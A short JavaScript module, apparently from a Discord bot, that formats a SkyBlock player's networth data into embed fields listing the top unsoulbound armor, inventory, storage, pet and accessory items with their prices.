async function networthParser(profile) {
    let itemData = profile["types"];
  
    let armorField = {
      name: `🛡️ **Armor** - ${await getTitle("armor", itemData)}`,
      value: (await getItems("armor", itemData, 3)) || "No unsoulbound armor found 🙁",
      inline: false,
    };
    let invField = {
      name: `🎒 **Inventory** - ${await getTitle("inventory", itemData)}`,
      value: (await getItems("inventory", itemData, 3)) || "No unsoulbound items found 🙁",
      inline: false,
    };
    let storageField = {
      name: `🎁 **Storage** - ${await getTitle("storage", itemData)}`,
      value: (await getItems("storage", itemData, 3)) || "No unsoulbound items found 🙁",
      inline: false,
    };
    let petField = {
      name: `😺 **Pets** - ${await getTitle("pets", itemData)}`,
      value: (await getItems("pets", itemData, 3)) || "No unsoulbound pets found 🙁",
      inline: false,
    };
  
    let accessoryField = {
      name: `👛 **Accessories** - ${await getTitle("accessories", itemData)}`,
      value: (await getItems("accessories", itemData, 3)) || "No unsoulbound accessories found 🙁",
      inline: false,
    };
    return [armorField, invField, storageField, petField, accessoryField];
  }
  
  async function getTitle(typeName, itemData) {
    let result;
    // if typeName ends in s, use are instead of is
    let isAre = "is";
    if (typeName.charAt(typeName.length - 1) === "s") {
      isAre = "are";
    }
    if (itemData[typeName]["unsoulboundTotal"] === 0) {
      result = `Awwww shucks, all their ${typeName.charAt(0).toUpperCase() +
        typeName.slice(1)} ${isAre} Soulbound!`;
    } else {
      result = `${Math.round(itemData[typeName]["unsoulboundTotal"]).toLocaleString()}`;
    }
    return result;
  }
  
  async function getItems(typeName, itemData, limit) {
    let i = 0;
    let result = "";
    for (let item of itemData[typeName]["items"]) {
      const soulbound = item["soulbound"];
      if (soulbound) {
        continue;
      }
      result += `${item["name"]} - *${Math.round(item["price"]).toLocaleString()}*\n`;
      if (limit) {
        i++;
        if (i === limit) {
          break;
        }
      }
    }
    if (result === "") {
      return null;
    }
    return result;
  }

module.exports = networthParser;